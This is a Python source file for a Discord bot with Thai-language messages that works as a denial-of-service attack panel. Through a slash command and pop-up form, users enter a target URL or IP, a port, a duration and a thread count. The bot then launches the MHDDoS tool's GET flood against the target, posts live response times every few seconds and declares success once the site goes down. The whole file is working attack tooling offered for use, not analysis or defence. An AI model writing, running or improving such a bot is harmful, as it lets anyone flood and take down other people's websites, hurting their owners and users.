import os
import threading
import asyncio
import subprocess
import time
import requests
from flask import Flask
import discord
from discord import app_commands
from discord.ui import View, Button, Modal, TextInput

# --- สร้าง Web Server เพื่อให้ Render รันบอทได้ตลอดเวลา ---
app = Flask('')

@app.route('/')
def home():
    return "DDoS Bot is running!"

def run_web():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    t = threading.Thread(target=run_web)
    t.start()

# --- Discord Bot Setup ---
intents = discord.Intents.default()
client = discord.Client(intents=intents)
tree = app_commands.CommandTree(client)

class DDoSModal(Modal, title="ตั้งค่าการโจมตี - เดียวรู้กัน"):
    target = TextInput(label="URL หรือ IP เว็บเป้าหมาย", placeholder="เช่น https://example.com หรือ 1.2.3.4", required=True)
    port = TextInput(label="Port เว็บ", placeholder="เช่น 80 หรือ 443", required=True)
    duration = TextInput(label="ระยะเวลา (วินาที, สูงสุด 500)", placeholder="500", required=True, max_length=3)
    threads = TextInput(label="จำนวนเครื่อง/เทรด (สูงสุด 50)", placeholder="50", required=True, max_length=2)

    async def on_submit(self, interaction: discord.Interaction):
        try:
            dur = int(self.duration.value)
            thr = int(self.threads.value)
            if dur > 500: dur = 500
            if thr > 50: thr = 50
        except ValueError:
            await interaction.response.send_message("❌ กรุณากรอกตัวเลขให้ถูกต้อง!", ephemeral=True)
            return

        target_val = self.target.value.strip()
        port_val = self.port.value.strip()

        embed = discord.Embed(
            title="🎯 เดียวรู้กัน - กำลังเตรียมการ...",
            description=f"**เป้าหมาย:** `{target_val}:{port_val}`\n**ระยะเวลา:** `{dur} วินาที`\n**เทรด:** `{thr}`",
            color=discord.Color.orange()
        )
        await interaction.response.send_message(embed=embed, ephemeral=False)
        msg = await interaction.original_response()

        # รันสคริปต์ MHDDoS ผ่าน Subprocess
        cmd = ["python3", "MHDDoS/start.py", "GET", f"{target_val}", str(thr), str(dur)]
        
        try:
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        except Exception as e:
            embed.title = "❌ เกิดข้อผิดพลาดในการรัน MHDDoS"
            embed.description = str(e)
            embed.color = discord.Color.red()
            await msg.edit(embed=embed)
            return

        start_time = time.time()
        
        # ลูปอัปเดตสถานะทุกๆ 3 วินาที
        while process.poll() is None:
            elapsed = int(time.time() - start_time)
            if elapsed >= dur:
                process.terminate()
                break
            
            # ตรวจสอบความเร็วและสถานะเว็บล่าสุด
            try:
                res_start = time.time()
                test_url = target_val if target_val.startswith("http") else f"http://{target_val}:{port_val}"
                r = requests.get(test_url, timeout=2)
                speed_ms = int((time.time() - res_start) * 1000)
                status_code = r.status_code
            except:
                speed_ms = 0
                status_code = "0 (ไม่ตอบสนอง / Down)"

            live_embed = discord.Embed(
                title="⚔️ เดียวรู้กัน - กำลังยิง...",
                description=f"🌐 **เป้าหมาย:** `{target_val}:{port_val}`\n⏱️ **เวลา:** `{elapsed}/{dur} วินาที`\n⚡ **ความเร็วตอบสนองล่าสุด:** `{speed_ms} ms`\n📌 **สถานะเว็บ:** `{status_code}`",
                color=discord.Color.yellow()
            )
            try:
                await msg.edit(embed=live_embed)
            except:
                pass
            
            # ถ้าเว็บความเร็วเป็น 0 หรือไม่ตอบสนองแล้ว สามารถหยุดก่อนเวลาได้
            if status_code == "0 (ไม่ตอบสนอง / Down)":
                process.terminate()
                break

            await asyncio.sleep(3)

        process.terminate()
        
        success_embed = discord.Embed(
            title="✅ สำเร็จแล้ว!",
            description=f"เป้าหมาย `{target_val}:{port_val}` หลุดการเชื่อมต่อหรือเวลาหมดลงแล้ว",
            color=discord.Color.green()
        )
        await msg.edit(embed=success_embed)

class DDoSView(View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="🚀 เริ่มตั้งค่าการยิง", style=discord.ButtonStyle.danger, custom_id="start_ddos_btn")
    async def button_callback(self, interaction: discord.Interaction, button: Button):
        await interaction.response.send_modal(DDoSModal())

@tree.command(name="d", description="เปิดเมนูเดียวรู้กัน")
async def d_command(interaction: discord.Interaction):
    embed = discord.Embed(
        title="เดียวรู้กัน - Panel",
        description="กดปุ่มด้านล่างเพื่อใส่ข้อมูลเป้าหมาย",
        color=discord.Color.blurple()
    )
    await interaction.response.send_message(embed=embed, view=DDoSView(), ephemeral=False)

@client.event
async def on_ready():
    await tree.sync()
    print(f"Logged in as {client.user}")

if __name__ == "__main__":
    keep_alive()
    TOKEN = os.getenv("BOT_TOKEN")
    if TOKEN:
        client.run(TOKEN)
    else:
        print("ERROR: ไม่พบ BOT_TOKEN ใน Environment Variables!")
